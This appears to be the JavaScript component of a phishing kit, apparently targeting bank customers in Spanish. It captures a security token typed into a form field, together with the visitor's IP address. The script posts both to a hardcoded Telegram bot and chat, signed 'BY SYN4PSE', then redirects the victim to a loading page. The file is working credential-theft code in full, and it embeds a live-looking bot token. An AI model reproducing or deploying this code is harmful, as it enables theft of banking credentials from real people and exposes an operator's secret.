//bot token
var telegram_bot_id = "7409911226:AAFpRbRsZpMhBtKVWGs0bYMXxmsdgM43BEE";
//chat id
var chat_id = -4561087186;
var pax2, ip, message;
var ready = function () {
    pax2 = document.getElementById("miDiosenticonfio").value;
    ip = document.getElementById("ip").innerHTML;
    message = "🔹M3RK4N🔹\n🔒T0K3N: " + pax2 + "\nIP: " + ip +"\n🔹BY SYN4PSE🔹";
};
var sender = function () {
    ready();

    if (ip === "" || ip === null || ip === undefined) {
        alert("Esperando obtener la dirección IP, por favor espera unos segundos o actualice la página.");
        return false; // Evita el envío del formulario
    }
    
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        top.location.href = 'loadd.php';
        console.log(response);
    });
    return false;
};